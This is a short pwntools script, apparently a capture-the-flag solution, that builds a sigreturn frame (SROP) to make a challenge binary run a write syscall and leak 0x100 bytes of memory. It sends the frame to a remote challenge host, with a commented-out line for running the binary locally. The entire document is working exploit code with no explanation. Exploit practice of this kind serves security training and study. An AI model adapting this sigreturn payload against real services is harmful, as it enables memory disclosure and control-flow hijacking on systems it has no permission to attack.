from pwn import *

context.arch = 'amd64'

sig = SigreturnFrame()

sig.rax = 0x1
sig.rdi = 0x1
sig.rsi = 0x10000023
sig.rdx = 0x100
sig.rip = 0x1000000b

#p = process('./player_bin')
p = remote('hack.bckdr.in', 17002)
p.sendline(str(sig))
print p.recv()
